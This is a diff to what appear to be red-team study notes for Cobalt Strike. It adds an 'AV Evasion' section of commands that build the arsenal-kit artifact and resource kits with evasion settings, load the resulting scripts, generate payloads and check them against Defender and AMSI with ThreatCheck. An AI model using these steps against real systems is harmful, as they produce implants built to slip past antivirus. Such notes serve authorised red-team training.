@@ -25,12 +25,39 @@ WantedBy=multi-user.target
 sudo systemctl daemon-reload;sudo systemctl enable teamserver.service;sudo systemctl start teamserver.service;sudo systemctl status teamserver.service
 ```
 
+
+
 # AV Evasion
 
 WSL
-```
+```bash
 cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
+```
 
+```shell
 ./build.sh pipe VirtualAlloc 277492 5 false false /mnt/c/Tools/cobaltstrike/artifacts
+```
 
+```shell
+cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
+```
+
+```bash
+./build.sh /mnt/c/Tools/cobaltstrike/resources
+```
+
+Open script manager in CS and load
+
+/mnt/c/Tools/cobaltstrike/artifacts/pipe/artifact.cna
+
+/mnt/c/Tools/cobaltstrike/resources/resources.cna
+
+Generate All Payloads and test with
+
+```Powershell
+C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\smb_x64.svc.exe
+```
+
+``` Powershell
+C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\http_x64.ps1 -e AMSI
 ```
